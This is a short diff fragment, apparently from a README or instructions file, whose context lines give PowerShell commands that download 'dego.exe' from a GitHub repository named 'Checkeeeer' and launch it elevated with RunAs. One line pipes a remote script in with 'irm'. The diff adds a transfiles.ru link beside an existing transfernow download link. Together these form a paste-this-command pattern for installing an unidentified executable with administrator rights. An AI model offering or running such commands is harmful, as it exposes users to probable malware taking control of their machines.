@@ -9,3 +9,5 @@ powershell -c "irm https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/de
 iwr "https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dego.exe" -OutFile "$env:TEMP\dego.exe" -UseBasicParsing; Start-Process "$env:TEMP\dego.exe" -Verb RunAs
 
 https://www.transfernow.net/dl/20260906w2KZGrSM
+
+https://transfiles.ru/gy0jd
